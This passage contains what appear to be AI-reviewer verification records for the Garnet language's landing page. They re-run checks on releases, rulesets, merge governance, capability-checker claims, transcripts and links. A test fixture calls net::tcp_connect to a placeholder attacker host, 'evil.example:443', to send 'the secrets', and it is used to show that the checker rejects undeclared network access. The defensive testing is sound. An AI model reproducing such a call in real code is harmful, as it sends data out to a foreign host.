    fbd64bc514b573a6735b3525f4f3172be14a27d0 records(l2): landing-arc-2 register sweep at 080da696 (#541)

Result: PASS. Both the base and displayed fbd64bc5 commit exist on origin/main ancestry.

2b. Release assets

    $ gh release view v0.8.1 --repo Island-Dev-Crew/garnet --json assets -q '.assets[].name'
    garnet-0.7.0-lsp-mvp-darwin-arm64.vsix
    garnet-0.7.0-lsp-mvp-linux-x64.vsix
    garnet-0.8.1-1.x86_64.rpm
    garnet-0.8.1-aarch64-apple-darwin.tar.gz
    garnet-0.8.1-x86_64-apple-darwin.tar.gz
    garnet-sbom-cyclonedx.tgz
    garnet_0.8.1-1_amd64.deb
    SHA256SUMS
    SHA256SUMS.asc

Result: PASS. SHA256SUMS, its `.asc` signature asset, and the CycloneDX SBOM asset exist.

2c. Ruleset

    $ gh api repos/Island-Dev-Crew/garnet/rulesets/18936562 --jq '{...}'
    {"bypass_actors":[],"enforcement":"active","required_status_checks_contexts":["Analyze (rust)","Build VSIX (macos-latest)","Build VSIX (ubuntu-latest)","Cross-OS determinism comparison","CycloneDX SBOM","Deterministic build on macos-latest","Deterministic build on ubuntu-latest","Generate single signing key for cross-OS build","Garnet web PWA smoke","PR dogfood evidence","Windows Studio build + test","agentic dogfood matrix","agent documentation contracts","build-packages","canonical MVP examples","cargo audit","cargo fuzz run parse_input","cargo doc","cargo test (macos-latest)","cargo test (ubuntu-latest)","cargo test (windows-latest)","cargo-deny check","clippy (-D warnings)","machine-truth drift guard","macOS Studio build + test","macos-cli-tarballs (aarch64-apple-darwin)","macos-cli-tarballs (x86_64-apple-darwin)","rustfmt","shellcheck-installer","smoke-deb","smoke-rpm"],"required_status_checks_count":31}

    $ curl -s -o /dev/null -w 'http_code=%{http_code}\n' https://github.com/Island-Dev-Crew/garnet/rules/18936562
    http_code=200

Result: PASS: enforcement `active`, `bypass_actors: []`, 31 required contexts, unauthenticated rules URL HTTP 200.

2d. WV-6

    $ perl -e 'alarm shift; exec @ARGV' 300 python3 -I scripts/garnet_wv_acceptance_status.py --wv WV-6
    {
      "artifact_count": 5,
      "contract_base_main_sha": "231aefa91985e5a0520c493c7f0fc3e54d74efc8",
      "evidence_destination": "proofs/windows/launch-verification/wv6-minimum-shelf/",
      "findings": [
        "product content digest mismatch (32c00f5982172b49c258eefd462c41c344bdb5dfc0552c5d8f851db2840f4119 != 6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6)",
        "product path count mismatch (1652 != 1646)"
      ],
      "ok": false,
      "state": "partial",
      "wv": "WV-6"
    }
    wv6_exit=0

    $ grep -n 'U-58' F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md | head -3
    36:  not block allocation. U-58 and U-59 appear nowhere. **U-58 is the next free
    49:| U-58 | Acceptance squash-successor gap | #523 ceremony rail; Read 1 at `8659771` | L1 | open |
    71:## U-58 — Acceptance squash-successor gap

Result: PASS. WV-6 is exactly `partial`; U-58 is the acceptance squash-successor finding.

2e. Human merge authority

    $ cat .github/CODEOWNERS
    * @IslandDevCrew
    /GOVERNANCE.md @IslandDevCrew
    /SECURITY.md @IslandDevCrew
    ...

    $ sed -n '1,20p' GOVERNANCE.md
    Garnet is maintained by **Island Development Crew (Jon Isaac, maintainer)**. Final
    decisions on language design, releases, and merges are the maintainer's,
    exercised through the `Island-Dev-Crew` GitHub organization.

    $ grep -n -i 'merge authority' F_Project_Management/W_TRUST/LANE1_GOVERNANCE_ACTIVATION_REVIEW_2026-07-17.md F_Project_Management/W_TRUST/WV6_REACCEPTANCE_REGISTRATIONS_2026-08-10.md
    F_Project_Management/W_TRUST/LANE1_GOVERNANCE_ACTIVATION_REVIEW_2026-07-17.md:8:Merge authority: Jon only
    F_Project_Management/W_TRUST/WV6_REACCEPTANCE_REGISTRATIONS_2026-08-10.md:11:- Merge authority: Jon (`IslandDevCrew`) only.

Result: PASS. “One human gate: Jon Isaac” is supported.

3. Tagline claims

Fresh fixture:

    @caps()
    def main() {
      net::tcp_connect("evil.example:443", "the secrets")
      0
    }

Before the first check:

    $ find . -maxdepth 1 -name '.garnet-cache' -print
    (no output)

Checker:

    $ <worktree>/target/release/garnet check exfil.garnet
    caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

    1 functions checked, 1 boundary call sites, 1 diagnostics

    $ echo $?
    1

Afterward:

    $ find . -maxdepth 1 -name '.garnet-cache' -print
    ./.garnet-cache

A second check then emits the cache-specific note:

    note: this source has 1 prior failure(s) recorded in .garnet-cache/episodes.log
    caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

    1 functions checked, 1 boundary call sites, 1 diagnostics
    1

Result: PASS. The page correctly names the fresh-directory/no-prior-cache condition.

Authority diff:

    $ <worktree>/target/release/garnet diff-caps --machine hello.garnet declared.garnet
    {"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}

    $ echo $?
    1

Result: PASS.

Build:

    $ <worktree>/target/release/garnet build --deterministic hello.garnet
    built hello.garnet (1 items)
      source_hash = 33b6ee769ddf95cc09a4778af656aa1c8a23c759bbccba50eec73547a96a257a
      ast_hash    = be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2
      manifest    = hello.garnet.manifest.json

    $ echo $?
    0

Manifest fields:

      "ast_hash": "be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"
      "source_hash": "33b6ee769ddf95cc09a4778af656aa1c8a23c759bbccba50eec73547a96a257a"

Seal stdout contains:

    {"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1",...

Seal stderr:

    garnet seal: cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don't-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)

Seal exit: 0.

Result: PASS. The displayed predicate type, digest endpoints, and UNSIGNED note match verbatim.

4. Capture block

Command: an HTMLParser/subprocess comparator extracted the rendered `<pre>`, reconstructed the fresh-directory commands and outputs, split only on each literal U+2026 ellipsis, and required every other character to match in order.

Verbatim result:

    fresh_cache_before=True
    check_exit=1
    diff_caps_exit=1
    seal_exit=0
    ellipsis_count=3
    literal_chunk_count=4
    literal_chunks_in_order=True
    ellipsis_aware_full_transcript_match=True

Result: PASS. No blocking transcript mismatch.

5. Door field

All local href results:

    EXISTS /blog/feed.xml -> docs/blog/feed.xml
    EXISTS assets/garnet-promo.mp4 -> docs/assets/garnet-promo.mp4
    EXISTS blog/ -> docs/blog/index.html
    EXISTS cra-article-14.html -> docs/cra-article-14.html
    EXISTS getting-started.html -> docs/getting-started.html
    EXISTS governance.html -> docs/governance.html
    EXISTS icons/garnet-192.png -> docs/icons/garnet-192.png
    EXISTS ladder.html -> docs/ladder.html
    EXISTS logo-policy.html -> docs/logo-policy.html
    EXISTS manifest.webmanifest -> docs/manifest.webmanifest
    EXISTS minispec.html -> docs/minispec.html
    EXISTS playground.html -> docs/playground.html
    EXISTS status.html -> docs/status.html
    EXISTS stdlib.html -> docs/stdlib.html
    EXISTS why.html -> docs/why.html

All HTTPS href results:

    HTTP 200 https://garnet-lang.org/
    HTTP 200 https://github.com/Island-Dev-Crew/garnet
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/blob/main/docs/truth.json
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/rules/18936562
    HTTP 200 https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST
    HTTP 200 https://islanddevcrew.com

Playground:

    playground_html_exit=0
    playground_wasm_exit=0
    docs/playground/live.js:2:  check_source,
    docs/playground/live.js:3:  diff_caps_source,
    docs/playground/live.js:4:  run_source,
    docs/playground/live.js:77:  const result = parseAdapterJson(run_source(ui.source.value), RUN_SCHEMA);
    docs/playground/live.js:93:  const result = parseAdapterJson(check_source(ui.source.value), CHECK_SCHEMA);
    docs/playground/live.js:106:    diff_caps_source(ui.baseline.value, ui.source.value),

Shelf search:

    $ find docs -maxdepth 3 \( -iname 'shelf.html' -o -type d -iname 'shelf' \) -print
    (no output)

Result: PASS. Playground is open; Shelf is locked and has no page.

6. Primitive count and release posture

    $ git show HEAD:docs/truth.json | grep primitive_count
      "primitive_count": 80,

    $ grep -n -i 'research-grade' CLAUDE.md
    32:  `garnet-0.5.0-*` build. Still research-grade, not production/1.0.
    35:- Garnet is a **research-grade prototype (v0.x.x), not production / 1.0.**

    $ git tag --sort=-v:refname | head -1
    v0.8.1

Result: PASS.

7. Static page and external requests

External resource probes:

    $ rg -n 'src="https?://|poster="https?://' docs/index.html
    (no output)

There are no external font, script, image, iframe, video, or stylesheet loads. The HTTPS canonical, social metadata, evidence links, and `og:image`/Twitter declarations are declarations or user-followed links, not subresource requests.

Same-origin resource references are:

    manifest.webmanifest
    icons/garnet-192.png
    assets/garnet-promo-poster.png
    assets/garnet-promo.webm
    assets/garnet-promo.mp4
    service-worker.js

The script is inline, SVGs are inline, and the service worker registration is same-origin.

Result: PASS under the page’s cross-origin meaning of “zero external requests.”

8. Retired vocabulary and present-tense capability audit

    $ grep -inE '[retired word elided by the transporting seat]' docs/index.html
    (no output)

    retired_vocab_exit=1

Capability assertions:

1. Checker rejects an undeclared call into its registered capability surface — EXISTS; exact diagnostic and exit 1 reproduced.
2. Diffs report widened authority — EXISTS for the expressly disclosed declared surface; `authority-expanded`, `aggregate_gained:["net"]`, exit 1.
3. Deterministic builds and seals are independently recomputable — EXISTS; manifest hashes and in-toto predicate reproduced.
4. “The integration, not the parts,” “well-precedented,” and “agent-authored code” — SUPPORTED by `GARNET_POSITIONING.md` and its gate.
5. Research-grade v0.8.1 — EXISTS; CLAUDE.md and newest semantic version tag agree.
6. Source builds require Rust 1.95+ — EXISTS; MSRV reporter is green at 1.95.
7. Playground runs in the browser — EXISTS; HTML, WASM, and all three adapter functions are present.
8. 80 registered primitives — EXISTS; machine truth and CLI version output agree.
9. The terminal is a real fresh-directory capture — REPRODUCED; full ellipsis-aware transcript match.
10. Check and diff-caps are available in-browser — EXISTS in `live.js`.
11. Shelf remains unavailable until evidence exists — ACCURATELY LOCKED; exactly one locked door and no Shelf page.
12. Acceptance keeps implementation, independent review, record, approval, and merge distinct — SUPPORTED by repository governance and AGENTS.md.
13. Public register spans U-04 through U-83 with historical gaps — EXISTS in the current register and allocation table.
14. Promo is thirty seconds — both embedded media formats report `duration=30.000000`.
15. Promo manifests verify only their bound files; current embed files are not bound to those hashes — VERIFIED below.
16. Human/aesthetic acceptance remains open and full MIT/productization is incomplete — reporter output states both.
17. Static page makes no cross-origin subresource request — source audit passes.

Result: PASS.

8b. Acceptance item and register sentence

    docs/index.html:210:
    <li><span><b>Carrier approval</b> bound to the record's commit, then the merge — separate acts, one human gate.</span></li>

AGENTS.md states:

    U-59 is its only exception.
    ...
    Until the carrier exists and `r2_role_separation_v1` is executable and green, the
    exception is contract law but is ineligible for activation.

The page no longer presents post-approval re-evaluation as operative.

Rendered register sentence:

    findings U-04 through U-83, historical gaps recorded.

Register evidence:

    F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:28:
    - result: the distinct id space runs U-04 through U-76 with the historical

    F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:42:
    | U-83 | Four memory natives are caps-invisible | enforcement scope; L6 packet; #537 review; #539 | L8 product (stdlib rows) | open |

    F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:308:
    - Candidates processed: 7 new allocations (U-77 through U-83), 0 backfills,

Result: PASS.

9. Accessibility and responsiveness source sanity

Relevant source:

    159: <nav class="doors wrap" aria-label="Everything on this site">
    172: <span class="door locked" role="link" aria-disabled="true" tabindex="0"
    74:  .door:hover,.door:focus-visible{...}
    75:  .door:focus-visible{box-shadow:0 0 0 2px rgba(214,69,80,.45)}
    36:  @media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}
    91:  .term pre{...overflow-x:auto;white-space:pre}
    124: @media(prefers-reduced-motion:no-preference){...}

At 320px, the 560px media rule replaces the fixed door minimum with `calc(50% - 9px)`; two 131px items plus the 9px gap fit the 280px padded content area. The video’s HTML dimensions are overridden by `width:100%; height:auto`; long terminal content scrolls inside `<pre>`. No fixed content width forces page overflow.

Contrast recomputation:

    #8a8794 on #0a0a0f: 5.618654:1
    #8a8794 on #12121a: 5.299936:1
    #8a8794 on #161620: 5.107025:1

Result: PASS.

9b. v3 cures

Meta description:

    <meta name="description" content="... A capability-bounded language whose checker rejects an undeclared call into its registered capability surface, and whose builds and seals a stranger can recompute. ...">

MSRV gate:

    $ PYTHONDONTWRITEBYTECODE=1 python3 -I scripts/garnet_msrv_status.py --gate
    {
      "findings": [],
      "msrv": "1.95",
      "ok": true,
      "workspace_member_count": 16,
      "workspace_members_inheriting": 16
    }
    msrv_exit=0

Truth markers are present for version, primitive count, and workspace test count.

    $ PATH=/Users/IDC2.5/.rustup/toolchains/1.95.0-aarch64-apple-darwin/bin:$PATH cargo run -q -p xtask -- truth --check --skip-tests
    truth --check: ok (6 fields vs machine truth, 4 stamped surfaces)
    truth_check_exit=0

Transcript:

    literal_chunks_in_order=True
    ellipsis_aware_full_transcript_match=True

CSS:

    --faint:#8a8794;
    @media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}

Result: PASS on all six v3 cures.

9c. v4/v5 additions

Positioning:

    $ PYTHONDONTWRITEBYTECODE=1 python3 scripts/garnet_positioning_status.py --gate
    {
      "schema": "garnet.positioning_status/v1",
      "positioning_doc_present": true,
      "landing_present": true,
      "doc_missing_themes": [],
      "landing_missing_themes": [],
      "ok": true,
      "notes": []
    }
    positioning_exit=0

The landing copy contains all three required phrases and stays within `GARNET_POSITIONING.md` lines 17–31.

Promo reporter:

    $ python3 scripts/garnet_promo_video_status.py --format json
    {
      "status": "public-site-embedded",
      "completion_percent": 95.0,
      "target_duration_seconds": 30,
      "rendered_video_present": true,
      "visual_qa_present": true,
      "website_export_present": true,
      "public_site_embed_present": true,
      "visual_identity_locked": true,
      "source_surfaces_locked": true,
      "open_gates": [
        "human/aesthetic acceptance"
      ]
    }
    promo_status_exit=0

Assets:

    docs/assets/garnet-promo-poster.png 467479 bytes
    docs/assets/garnet-promo.webm 1103112 bytes
    docs/assets/garnet-promo.mp4 450674 bytes

Durations:

    filename=docs/assets/garnet-promo.mp4
    duration=30.000000
    filename=docs/assets/garnet-promo.webm
    duration=30.000000

All four evidence manifests verify their bound files:

    /Users/IDC2.5/Desktop/dogfood/garnet-promo-video
    garnet-promo.mp4: OK
    garnet-promo.webm: OK
    garnet-promo-poster.png: OK
    promo-render-data.json: OK
    promo-render-report.md: OK

    /Users/IDC2.5/Desktop/dogfood/garnet-promo-video-visual-qa
    sample-00.png: OK
    sample-30.png: OK
    sample-59.png: OK
    promo-visual-qa-data.json: OK
    promo-visual-qa-report.md: OK

    /Users/IDC2.5/Desktop/dogfood/garnet-promo-video-website-export
    garnet-promo.mp4: OK
    garnet-promo.webm: OK
    garnet-promo-poster.png: OK
    embed-snippet.html: OK
    promo-website-export-data.json: OK
    promo-website-export-report.md: OK

    /Users/IDC2.5/Desktop/dogfood/garnet-promo-video-site-sync
    promo-site-sync-data.json: OK
    promo-site-sync-report.md: OK

Current embed hashes:

    ab5cf1050ecd94e61a56459f7cae0fb0295219b98e6077a43ac81d22da132c0f  docs/assets/garnet-promo.mp4
    62b19c65581d03ccf53b0260392cd48ac17b537c122365dc8411d93a5d94e046  docs/assets/garnet-promo.webm
    ee4f73f0614d572568b3e57f55c2e56301aab52916cfdee3086350d5ba29561f  docs/assets/garnet-promo-poster.png

Manifest-bound export hashes:

    703c2bf6715942ca500f7716fe7d5d24f1e13d6f5746faa91c12b8ed56b5b9e7  garnet-promo.mp4
    9a96488c3e5c78a21ece9abd05dc280e821f493279867053cf39a2c60dcf3da2  garnet-promo.webm
    d9ccd2e55865528ea3349c88bf6fe7745c742a68efbc6429282e43e9559fdd72  garnet-promo-poster.png

Result: PASS. The manifests verify their own bound files, and the current embed hashes differ, exactly matching the v5 disclosure that these embed files are not hash-bound to those manifests.

10. Rolling gate

    $ perl -e 'alarm shift; exec @ARGV' 300 python3 -I scripts/garnet_trust_kernel_review_status.py --base f77a3ebd6d5890d0d46eb71633446b7275995956 --head HEAD --format json
    {
      "schema": "garnet.trust_kernel_review/v2",
      "ok": true,
      "discovery_ok": true,
      "discovery_source": "git",
      "base_commit": "f77a3ebd6d5890d0d46eb71633446b7275995956",
      "head_commit": "b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7",
      "trust_kernel_touched": false,
      "touched_paths": [],
      "review_record_present": false,
      "review_record_path": null,
      "changed_count": 3,
      "problems": [],
      "review_companion_present": false,
      "companion_paths": [],
      "review_trailer_present": false
    }

Result: PASS. `docs/index.html` is outside the trust-kernel path set; `docs/why.html` remains enumerated as a trust-kernel file.

Final exact-head recheck:

    $ git rev-parse HEAD
    b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7

    $ git status --porcelain=v1
    (no output)

    $ git diff --check f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
    (no output)

Standards axis: no finding.  
Spec/public-truth axis: no finding.  
VOID-ON-MOVE: this confirmation is void—not stale, void—the instant HEAD moves.

VERDICT: CONFIRM — bound to b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7

1. None — blocking findings: 0; non-blocking findings: 0.



```

## Reviewing seat output — v4 (verbatim; superseded, retained for lineage)

```text
REVIEW BINDING

Author seat: Claude
Reviewer seat: OpenAI Codex
Base: f77a3ebd6d5890d0d46eb71633446b7275995956
Candidate: 427d51aff4b2bf7f0d5092cbb3739bc2442e0a73

$ git rev-parse HEAD
427d51aff4b2bf7f0d5092cbb3739bc2442e0a73

$ git rev-parse 'HEAD^{tree}'
71e6cd4aeaab0fb84adffe13148c315d25311792

$ git status --porcelain
(no output; exit 0, both before and after review)

ITEM 1 — DIFF SCOPE

$ git diff --stat fbd64bc5..HEAD
 .../W_TRUST/CRA_ANCHORS_REVIEW_2026-09-02.md       |  196 ++
 .../W_TRUST/FRONT_DOOR_REVIEW_2026-09-02.md        | 1490 ++++++++++++++++
 .../W_TRUST/SECURITY_MD_TRUTH_REVIEW_2026-09-02.md |  825 +++++++++
 SECURITY.md                                        |   27 +-
 docs/cra-article-14.html                           |    2 +-
 docs/index.html                                    | 1869 +++-----------------
 docs/service-worker.js                             |    2 +-
 7 files changed, 2755 insertions(+), 1656 deletions(-)

$ git diff --name-status fbd64bc5..HEAD
A	F_Project_Management/W_TRUST/CRA_ANCHORS_REVIEW_2026-09-02.md
A	F_Project_Management/W_TRUST/FRONT_DOOR_REVIEW_2026-09-02.md
A	F_Project_Management/W_TRUST/SECURITY_MD_TRUTH_REVIEW_2026-09-02.md
M	SECURITY.md
M	docs/cra-article-14.html
M	docs/index.html
M	docs/service-worker.js

Result: FAIL. The specified range contains seven files, not two.

Against the stated base:

$ git diff --stat f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
 .../W_TRUST/FRONT_DOOR_REVIEW_2026-09-02.md        | 1490 ++++++++++++++++
 docs/index.html                                    | 1869 +++-----------------
 docs/service-worker.js                             |    2 +-
 3 files changed, 1718 insertions(+), 1643 deletions(-)

$ git log --oneline f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
427d51a site(front-door): carry the positioning themes and the promo embed the gates require
0d45e43 records(front-door): Codex confirmation record, three lineages (CONFIRM bound to 36040564; rebased content byte-identical)
29651b6 site(front-door): replace the June index with the evidence front door

The stated three-commit topology is confirmed, but even the base-to-head range contains three files because the review record is committed between the two content commits.

ITEM 2 — EVIDENCE STRIP

2a. Main ancestry

$ git fetch origin
(no output; exit 0)

$ git rev-parse origin/main
f77a3ebd6d5890d0d46eb71633446b7275995956

$ git merge-base --is-ancestor f77a3ebd6d5890d0d46eb71633446b7275995956 origin/main
(no output; exit 0)

$ git merge-base --is-ancestor fbd64bc514b573a6735b3525f4f3172be14a27d0 origin/main
(no output; exit 0)

Result: PASS under the requested “exists on origin/main” meaning. fbd64bc5 is an ancestor of current origin/main; it is not the current tip.

2b. Release assets

$ gh release view v0.8.1 --repo Island-Dev-Crew/garnet --json assets -q '.assets[].name'
garnet-0.7.0-lsp-mvp-darwin-arm64.vsix
garnet-0.7.0-lsp-mvp-linux-x64.vsix
garnet-0.8.1-1.x86_64.rpm
garnet-0.8.1-aarch64-apple-darwin.tar.gz
garnet-0.8.1-x86_64-apple-darwin.tar.gz
garnet-sbom-cyclonedx.tgz
garnet_0.8.1-1_amd64.deb
SHA256SUMS
SHA256SUMS.asc

Result: PASS for asset presence. SHA256SUMS, SHA256SUMS.asc, and garnet-sbom-cyclonedx.tgz all exist. This confirms the advertised asset surfaces; it was not a cryptographic re-verification of the detached signature.

2c. Ruleset

$ gh api repos/Island-Dev-Crew/garnet/rulesets/18936562 --jq '{enforcement: .enforcement, bypass_actors: .bypass_actors, required_status_checks_count: ([.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[]] | length), required_status_checks_contexts: [.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[].context]}'
{"bypass_actors":[],"enforcement":"active","required_status_checks_contexts":["Analyze (rust)","Build VSIX (macos-latest)","Build VSIX (ubuntu-latest)","Cross-OS determinism comparison","CycloneDX SBOM","Deterministic build on macos-latest","Deterministic build on ubuntu-latest","Generate single signing key for cross-OS build","Garnet web PWA smoke","PR dogfood evidence","Windows Studio build + test","agentic dogfood matrix","agent documentation contracts","build-packages","canonical MVP examples","cargo audit","cargo fuzz run parse_input","cargo doc","cargo test (macos-latest)","cargo test (ubuntu-latest)","cargo test (windows-latest)","cargo-deny check","clippy (-D warnings)","machine-truth drift guard","macOS Studio build + test","macos-cli-tarballs (aarch64-apple-darwin)","macos-cli-tarballs (x86_64-apple-darwin)","rustfmt","shellcheck-installer","smoke-deb","smoke-rpm"],"required_status_checks_count":31}

$ curl -s -o /dev/null -w '%{http_code}' https://github.com/Island-Dev-Crew/garnet/rules/18936562
200

Result: PASS — active, bypass_actors [], 31 required contexts, public URL 200.

2d. WV-6 and U-58

The reporter was wrapped in a 300-second wall-clock alarm.

$ python3 -I scripts/garnet_wv_acceptance_status.py --wv WV-6
{
  "artifact_count": 5,
  "contract_base_main_sha": "231aefa91985e5a0520c493c7f0fc3e54d74efc8",
  "evidence_destination": "proofs/windows/launch-verification/wv6-minimum-shelf/",
  "findings": [
    "product content digest mismatch (6b4bd3a9b9548d7fd03d704dd23e7b94a2b40b2d1a884644df2eabf000f080d9 != 6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6)",
    "product path count mismatch (1652 != 1646)"
  ],
  "landed_main_sha": null,
  "ok": false,
  "passed_check_count": 5,
  "product_content_sha256": "6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6",
  "required_check_count": 5,
  "reviewed_head_sha": "8426ca761c696c3556190be77cce3e340250b5c7",
  "reviewed_tree_sha": "601a368414762646ec9e5ad29b53736e20628474",
  "schema": "garnet.wv_acceptance_status/v2",
  "state": "partial",
  "wv": "WV-6"
}

$ grep -n 'U-58' F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md | head -3
36:  not block allocation. U-58 and U-59 appear nowhere. **U-58 is the next free
49:| U-58 | Acceptance squash-successor gap | #523 ceremony rail; Read 1 at `8659771` | L1 | open |
71:## U-58 — Acceptance squash-successor gap

Result: PASS — WV-6 state is verbatim “partial”; U-58 is the squash-successor finding.

2e. Human merge gate

$ grep -nE '^\* |Merge authority: Jon only|decisions on language design, releases, and merges|final merge remains an explicit human action' .github/CODEOWNERS GOVERNANCE.md F_Project_Management/W_TRUST/LANE1_GOVERNANCE_ACTIVATION_REVIEW_2026-07-17.md
.github/CODEOWNERS:4:* @IslandDevCrew
GOVERNANCE.md:10:Garnet is maintained by **Island Development Crew (Jon Isaac, maintainer)**. Final
GOVERNANCE.md:11:decisions on language design, releases, and merges are the maintainer's,
GOVERNANCE.md:47:The final merge remains an explicit human action. The checked-in ruleset README
F_Project_Management/W_TRUST/LANE1_GOVERNANCE_ACTIVATION_REVIEW_2026-07-17.md:8:Merge authority: Jon only

Result: PASS — “one human gate: Jon Isaac” is supported.

ITEM 3 — TAGLINE CLAIMS

Fixtures:

/tmp/exfil.garnet
@caps()
def main() {
  net::tcp_connect("evil.example:443", "the secrets")
  0
}

/tmp/hello.garnet uses the canonical examples/hello.garnet source: @caps(), main, println, return 0.

/tmp/declared.garnet
@caps(net)
def main() {
  net::tcp_connect("evil.example:443", "the secrets")
  0
}

3i. Registered-capability rejection

$ target/release/garnet check /tmp/exfil.garnet
note: this source has 2 prior failure(s) recorded in .garnet-cache/episodes.log
note: strategy 'warn_repeated_safe_violation' applies (Hamming distance 0/256, last triggered ts=1788367142)
caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

1 functions checked, 1 boundary call sites, 1 diagnostics

Exit: 1.

Result: the capability claim is functionally confirmed. The two additional note lines create the transcript mismatch reported under item 4.

3ii. Widened-authority diff

$ target/release/garnet diff-caps --machine /tmp/hello.garnet /tmp/declared.garnet
{"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}

Exit: 1.

Result: PASS — authority-expanded, aggregate_gained ["net"].

3iii. Deterministic build and seal

$ target/release/garnet build --deterministic /tmp/hello.garnet
built /tmp/hello.garnet (1 items)
  source_hash = 33b6ee769ddf95cc09a4778af656aa1c8a23c759bbccba50eec73547a96a257a
  ast_hash    = be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2
  manifest    = /tmp/hello.garnet.manifest.json

$ sed -n '1,160p' /tmp/hello.garnet.manifest.json
{
  "ast_hash": "be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"
,
  "deterministic_flags": ["lto=on", "codegen-units=1", "strip=symbols"]
,
  "interp_version": "0.8.1"
,
  "parser_version": "0.8.1"
,
  "prelude_hash": "df4f1648cf79ea77d0842fd1cb8725aba82be1b2631d5a906952640f9a25cc6d"
,
  "schema": "garnet-manifest-v1"
,
  "signature": ""
,
  "signer_pubkey": ""
,
  "source_hash": "33b6ee769ddf95cc09a4778af656aa1c8a23c759bbccba50eec73547a96a257a"
,
  "target_triple": "unknown-target"

}

$ target/release/garnet seal /tmp/hello.garnet
The TTY output begins:
{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1","predicate":{

It ends with:
garnet seal: cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don't-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)

Exit: 0.

Result: PASS. predicateType and the UNSIGNED note match the page verbatim; the manifest contains source_hash and ast_hash.

ITEM 4 — CAPTURE BLOCK

Source block: exact match.

Checker diagnostic, blank line, summary, and exit: exact match.

Blocking difference: the real checker output additionally contains:
note: this source has 2 prior failure(s) recorded in .garnet-cache/episodes.log
note: strategy 'warn_repeated_safe_violation' applies (Hamming distance 0/256, last triggered ts=1788367142)

The page says only long JSON lines were elided with “…”, so these unmarked extra lines violate the requested transcript contract.

Machine verification of the marked JSON elisions:

$ python3 -I -c '<extract pre lines; run diff-caps and seal; check chunks in order>'
diff: exit=1 chunks=2 positions=[0, 317] in_order=True spaces_around_elision=False
page={"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],…"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}
seal: exit=0 chunks=2 positions=[0, 146] in_order=True spaces_around_elision=False
page={"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b…bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1",…

Result: the ellided JSON chunks pass; the checker’s unmarked cache notes do not.

ITEM 5 — DOOR FIELD

Local href/resource resolution:

manifest.webmanifest	exists	740
icons/garnet-192.png	exists	67820
blog/feed.xml	exists	1974
why.html	exists	64965
minispec.html	exists	120559
getting-started.html	exists	7232
playground.html	exists	7997
status.html	exists	16153
governance.html	exists	4996
cra-article-14.html	exists	9409
stdlib.html	exists	8684
ladder.html	exists	27318
blog/index.html	exists	6520
assets/garnet-promo.mp4	exists	450674
logo-policy.html	exists	3768
